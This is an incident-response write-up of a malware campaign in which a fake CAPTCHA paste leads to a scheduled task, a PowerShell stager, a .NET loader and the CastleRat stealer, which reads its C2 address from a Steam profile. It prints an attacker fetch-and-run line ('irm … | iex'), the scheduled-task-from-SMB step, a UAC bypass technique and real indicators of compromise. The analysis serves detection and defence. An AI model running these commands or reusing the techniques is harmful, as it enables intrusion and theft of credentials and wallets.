---
id: castle-rat-delivery-chain
title: "CastleRat Delivery Chain"
summary: "A fake CAPTCHA paste pulls a scheduled task over SMB and ends in a CastleRat implant that finds its C2 in a Steam profile bio."
category: DFIR
date: 2026-10-02
tags: [clickfix, rat, castle-rat, delivery-chain, windows, malware]
---

# CastleRat Delivery Chain

## TL;DR

- Fake Cloudflare CAPTCHA paste creates a scheduled task from an XML file on the attacker's SMB share
- The task runs a PowerShell stager padded with junk code, which drops a .NET loader
- The loader brings its own Python runtime, bypasses UAC, and runs CastleRat
- C2 is read from a Steam profile bio, so the operator rotates it by editing a page

```
CLASS   : RAT delivery / ClickFix
VECTOR  : Win+R paste posing as a CAPTCHA
IMPLANT : CastleRat / NightShadeC2
C2      : 45.88.106.190:4545 (via Steam dead drop)
IMPACT  : Stealer + RAT: browsers, wallets, password managers, screenshots
```

## Attack Chain

```
CAPTCHA paste → cmd.exe
  → cmdkey + schtasks /XML from \\195.10.205.171\kxc\full.xml
  → task "Lowks": irm yhofgafjle.com | iex
  → junk-padded stager → maestrovsd.exe (.NET loader)
  → bundled Python in C:\ProgramData\<random>\ running install.pyc / melody.pyc
  → ComputerDefaults.exe UAC bypass
  → Steam profile → C2 → CastleRat
```

## What happened

The paste was a one-liner that stored guest creds for an attacker SMB share and created a scheduled task, `Lowks`, from `full.xml` on that share. A trailing `REM I am not a robot - Cloudflare ID: …` made it look like CAPTCHA text. Keeping the task on the share lets the operator change what it runs without touching the lure.

The task pulls a PowerShell stager from `yhofgafjle[.]com`. It's mostly hundreds of lines of dead code to dilute AMSI, with one real function that downloads `maestrovsd.exe`, a ~150KB .NET loader. The loader then fetches full signed Python runtimes (3.9 and 3.13) plus `install.pyc` and `melody.pyc`, so the process tree shows a trusted `pythonw.exe` running attacker bytecode. Elevation is the usual `ms-settings` registry hijack with `ComputerDefaults.exe`.

## The Steam dead drop

This is the interesting part. The implant doesn't hardcode its C2. It fetches a Steam Community profile, reads the bio, and extracts the address from it.

![Steam profile dead-drop resolver](assets/steam-dead-drop.png)

Here it resolved to `45.88.106.190:4545`, with a backup at `8.3.0.253`. Steam traffic rarely gets blocked in most environments, and swapping infrastructure is just editing a profile. Config extraction also gave an RC4 key that decrypts two more in-memory stages (~5MB and ~15MB). The Python is PyArmor-protected, so static analysis of the `.pyc` files went nowhere. YARA on process dumps hit both CastleRat and NightShadeC2, which suggests the same codebase or a close fork.

Once it's up, it's a full stealer: Chrome, Edge and Firefox data, a long list of crypto wallets and wallet extensions, 1Password and NordPass directories, VPN configs, FTP clients, and screenshots.

## IOCs

### Network

```
195.10.205.171                               SMB staging (cmdkey target)
yhofgafjle[.]com                             PowerShell stager
162.33.177.16                                Payload host
adamcold[.]com                               Payload host
212.43.154.198:23814                         Initial C2
45.88.106.190:4545                           Resolved C2
8.3.0.253                                    Backup C2
steamcommunity[.]com/id/dpmorin49sdiw302fw   Dead drop
```

### Hashes

```
maestrovsd.exe  e25534efbab99f08ca802c6d3974c2ff7c47ddd6e6ed71a84a94c2fddd7de4e2
install.pyc     b953bb0acb76848f889909256d67d01d44cc45d83c8bfc3421783ac0a79688fc
melody.pyc      91919832f20d8fb78bab82844a430ecbe02a07df3f317316a8c34f54e3bb45c2
```

### Host

```
Scheduled task "Lowks" (XML from \\195.10.205.171\kxc\full.xml)
C:\ProgramData\5171NWNrWQ\
C:\ProgramData\92WKzFYLqB\
C:\Windows\Temp\TrHtWFGyRY.exe
%LOCALAPPDATA%\NiceNickAlliceRachelCoach*
%LOCALAPPDATA%\StreamEtheriumLife*
RC4 key: Ymbjo9tV4hdp2Lt0
```
